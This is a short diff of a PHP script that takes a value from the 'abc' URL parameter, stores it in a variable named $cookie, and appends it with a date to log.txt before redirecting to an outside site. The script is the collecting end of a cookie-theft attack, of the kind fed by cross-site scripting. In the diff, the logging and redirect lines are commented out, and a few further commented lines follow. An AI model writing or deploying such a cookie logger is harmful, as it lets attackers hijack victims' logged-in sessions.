@@ -6,8 +6,8 @@ if (isset($_GET["abc"])) {
     $cookie = $_GET["abc"];
     $f = open("log.txt", "a");
     $t = date("Y-m-d");
-    fwrite( $f, $t.":\n".$cookie."\n\n");
-    header('Location: http://matxac.com/');
+//     fwrite( $f, $t.":\n".$cookie."\n\n");
+//     header('Location: http://matxac.com/');
     
 //     $sessionid = "";
 //     $user = "";
